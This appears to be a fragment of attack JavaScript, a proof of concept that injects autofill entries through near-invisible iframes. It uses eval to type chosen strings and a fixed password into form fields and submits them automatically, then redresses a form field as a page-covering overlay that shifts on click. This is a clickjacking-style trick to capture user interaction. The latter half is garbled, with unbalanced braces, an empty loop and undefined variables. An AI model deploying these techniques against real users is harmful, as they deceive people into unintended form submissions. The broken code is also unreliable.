<script>

var msgs=0;
var iframes=[];
function createAutofillEntry(str){

	let aframe=document.createElement('iframe');
		aframe.src='#faker';
		aframe.style='width:2px;height:3px;opacity:0.1';
		aframe['data-id']=msgs;
		iframes[msgs]=false;
		msgs+=1;
		
		document.body.appendChild(aframe);
		
		aframe.onload=e=>{
			if(e.target.contentWindow.location.search.length<=10){
				e.target.contentWindow.eval(`
					qb.value="pass1223"

					var thing="${str}";

					var i=0;
					var ger=0;
						ger=setInterval(g=>{
						qa.value+=thing[i];
						i++;
						if(thing.length==i){
							window.clearInterval(ger);
							qf.submit()
						}
					},20)
				`)
			}else{
				iframes[e.target['data-id']]=true;
			}
			
		}
	
}

if(location.hash=='#faker'){
	
}else if(location.hash=='#ok'){
qf.style="opacity:1";
qa.style="width:100%;height:1000px;display:block;position:absolute;";

qa.onmousedown=e=>{
	setTimeout(h=>{qmsg.style="opacity:1";},20);
	qa.style="width:50px;height:10px;position:absolute;top:-125px;left:0px;"
		setTimeout(g=>{qa.type='button'},100);
	
			for(q in this){
				if(q.indexOf('on')==0){

						}
						qa.focus();qa.click();return false
					
					}

			}

				}
			}
			
			if(tbr){

				location.reload(true);
			}
		},500)
